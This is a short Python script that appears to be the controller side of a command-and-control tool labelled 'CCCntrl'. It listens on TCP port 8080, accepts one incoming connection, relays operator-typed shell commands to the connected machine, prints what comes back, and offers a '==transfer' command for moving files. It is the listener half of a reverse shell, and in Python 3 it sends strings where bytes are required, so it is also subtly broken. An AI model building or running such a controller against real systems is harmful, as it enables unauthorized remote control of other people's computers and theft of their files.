#! /usr/bin/env python3

import socket 
import os # Needed for file operation
import modules


host = '127.0.0.1'
port = 8080
instruction = ''

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(
		'[CCCntrl] Listening for incoming TCP connection on port ' + str(port)
	)
    conn, addr = s.accept()
    print(
		'[CCCntrl] We got a connection from: ' + str(addr)
	)



    while True: 
        command = input("CCCtrl > ")
        if command == "==terminate":
            conn.send('==terminate')
            conn.close() 
            break
        elif command == '==transfer': 
            modules.transfer(conn,command)
        else:
            conn.send(command) 
            print(conn.recv(1024))

connect()